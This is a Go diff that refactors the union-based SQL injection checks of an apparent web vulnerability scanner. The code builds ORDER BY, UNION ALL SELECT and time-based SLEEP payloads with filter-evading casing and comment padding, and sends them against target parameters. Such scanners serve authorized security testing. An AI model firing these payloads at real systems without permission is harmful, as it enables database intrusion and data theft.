@@ -20,19 +20,21 @@ import (
   @desc: //TODO
 **/
 
-func (sql *Sqlmap) checkUnionBased(pos int, closeType int, lineBreak bool) {
-	if sql.guessColumnNum(pos, lineBreak, closeType) != -1 {
-		return
+func (sql *Sqlmap) checkUnionBased(pos int, closeType string) bool {
+	if sql.guessColumnNum(pos, closeType) != -1 {
+		return true
 	}
 
-	if sql.bruteColumnNum(pos, lineBreak, closeType) != -1 {
-		return
+	if sql.bruteColumnNum(pos, closeType) != -1 {
+		return true
 	}
+
+	return false
 
 }
 
 // 猜列数, 有回显
-func (sql *Sqlmap) guessColumnNum(pos int, lineBreak bool, closeType int) int {
+func (sql *Sqlmap) guessColumnNum(pos int, closeType string) int {
 	var payload string
 	var columnNum int
 	OrderByStep := 10
@@ -43,13 +45,13 @@ func (sql *Sqlmap) guessColumnNum(pos int, lineBreak bool, closeType int) int {
 	var condition_1, condition_2 bool
 	var defaultRatio float64 = -1
 
-	condition_1, defaultRatio, _ = sql.orderByTest(1, pos, lineBreak, closeType, defaultRatio)
+	condition_1, defaultRatio, _ = sql.orderByTest(1, pos, closeType, defaultRatio)
 
-	condition_2, defaultRatio, _ = sql.orderByTest(util.RandNumber(9999, 999999), pos, lineBreak, closeType, defaultRatio)
+	condition_2, defaultRatio, _ = sql.orderByTest(util.RandNumber(9999, 999999), pos, closeType, defaultRatio)
 
 	if condition_1 && !condition_2 {
 		for !found {
-			condition_volatile, defaultRatio_tmp, _ := sql.orderByTest(highCols, pos, lineBreak, closeType, defaultRatio)
+			condition_volatile, defaultRatio_tmp, _ := sql.orderByTest(highCols, pos, closeType, defaultRatio)
 			defaultRatio = defaultRatio_tmp
 			if condition_volatile {
 				lowCols = highCols
@@ -63,7 +65,7 @@ func (sql *Sqlmap) guessColumnNum(pos int, lineBreak bool, closeType int) int {
 					var condition_volatile_sec bool
 					mid := highCols - int(math.Round(float64((highCols-lowCols)/2)))
 
-					condition_volatile_sec, defaultRatio_tmp, res = sql.orderByTest(mid, pos, lineBreak, closeType, defaultRatio)
+					condition_volatile_sec, defaultRatio_tmp, res = sql.orderByTest(mid, pos, closeType, defaultRatio)
 
 					defaultRatio = defaultRatio_tmp
 					if condition_volatile_sec {
@@ -81,11 +83,8 @@ func (sql *Sqlmap) guessColumnNum(pos int, lineBreak bool, closeType int) int {
 
 				for index, param := range sql.Variations.Params {
 					if index == pos {
-						if lineBreak {
-							payload = param.Value + "\n" + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + strconv.Itoa(columnNum) + "#"
-						} else {
-							payload = param.Value + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + strconv.Itoa(columnNum) + "#"
-						}
+
+						payload = param.Value + closeType + `/**/ORDeR/**/bY/**/` + strconv.Itoa(columnNum) + "#"
 
 						JieOutput.OutChannel <- JieOutput.VulMessage{
 							DataType: "web_vul",
@@ -114,7 +113,7 @@ func (sql *Sqlmap) guessColumnNum(pos int, lineBreak bool, closeType int) int {
 }
 
 // 猜列数, 无回显，基于时间
-func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
+func (sql *Sqlmap) bruteColumnNum(pos int, closeType string) int {
 	var payload string
 	/* UPPER_COUNT - LOWER_COUNT *MUST* >= 5 */
 	LowerCount := 1
@@ -135,11 +134,8 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 	for index, param := range sql.Variations.Params {
 		if index == pos {
 			for i := LowerCount; i <= UpperCount; i++ {
-				if lineBreak {
-					payload = param.Value + "\n" + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(randStr, i)
-				} else {
-					payload = param.Value + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(randStr, i)
-				}
+
+				payload = param.Value + closeType + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(randStr, i)
 
 				payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
 
@@ -219,11 +215,8 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 		md5Randstr := util.RandLetters(5)
 		for index, param := range sql.Variations.Params {
 			if index == pos {
-				if lineBreak {
-					payload = param.Value + "\n" + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(fmt.Sprintf(`md5('%v'),`, md5Randstr), columnNum)
-				} else {
-					payload = param.Value + CloseType[closeType] + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(fmt.Sprintf(`md5('%v'),`, md5Randstr), columnNum)
-				}
+
+				payload = param.Value + closeType + `/**/UniOn/**/All/**/Select/**/` + strings.Repeat(fmt.Sprintf(`md5('%v'),`, md5Randstr), columnNum)
 
 				payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, strings.TrimRight(payload, ",")+"#", sql.Method)
 
@@ -268,11 +261,8 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 	for index, param := range sql.Variations.Params {
 		if index == pos {
 			for i := LowerCount; i <= UpperCount; i++ {
-				if lineBreak {
-					payload = param.Value + "\n" + CloseType[closeType] + `/**/UniOn/**/Select/**/` + strings.Repeat(randStr, i-1)
-				} else {
-					payload = param.Value + CloseType[closeType] + `/**/UniOn/**/Select/**/` + strings.Repeat(randStr, i-1)
-				}
+
+				payload = param.Value + closeType + `/**/UniOn/**/Select/**/` + strings.Repeat(randStr, i-1)
 
 				payload += sql.Variations.SetPayloadByIndex(param.Index, sql.Url, fmt.Sprintf(`SLeep(%v)#`, standardRespTime*2/1000+3), sql.Method)
 
@@ -321,16 +311,13 @@ func (sql *Sqlmap) bruteColumnNum(pos int, lineBreak bool, closeType int) int {
 	return -1
 }
 
-func (sql *Sqlmap) orderByTest(number, pos int, lineBreak bool, closeType int, defaultRatio float64) (bool, float64, *httpx.Response) {
+func (sql *Sqlmap) orderByTest(number, pos int, closeType string, defaultRatio float64) (bool, float64, *httpx.Response) {
 	var payload string
 
 	for index, param := range sql.Variations.Params {
 		if index == pos {
-			if lineBreak {
-				payload = param.Value + "\n" + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + strconv.Itoa(number) + "#"
-			} else {
-				payload = param.Value + CloseType[closeType] + `/**/ORDeR/**/bY/**/` + strconv.Itoa(number) + "#"
-			}
+
+			payload = param.Value + closeType + `/**/ORDeR/**/bY/**/` + strconv.Itoa(number) + "#"
 
 			payload = sql.Variations.SetPayloadByIndex(param.Index, sql.Url, payload, sql.Method)
 
@@ -345,11 +332,11 @@ func (sql *Sqlmap) orderByTest(number, pos int, lineBreak bool, closeType int, d
 			if err != nil {
 				continue
 			}
-			condition, defaultRatio := comparison(res.Body, res.StatusCode, sql.TemplateBody, sql.TemplateCode, defaultRatio)
+			condition, defaultRatio := sql.comparison(res.Body, res.StatusCode, defaultRatio)
 
-			math1 := util.MatchAnyOfRegexp([]string{"(warning|error):", "order (by|clause)", "unknown column", "failed"}, res.Body)
+			math1, _ := util.MatchAnyOfRegexp([]string{"(warning|error):", "order (by|clause)", "unknown column", "failed"}, res.Body)
 
-			math2 := util.MatchAnyOfRegexp([]string{"data types cannot be compared or sorted"}, res.Body)
+			math2, _ := util.MatchAnyOfRegexp([]string{"data types cannot be compared or sorted"}, res.Body)
 
 			return !math1 && condition || math2, defaultRatio, res
 		}
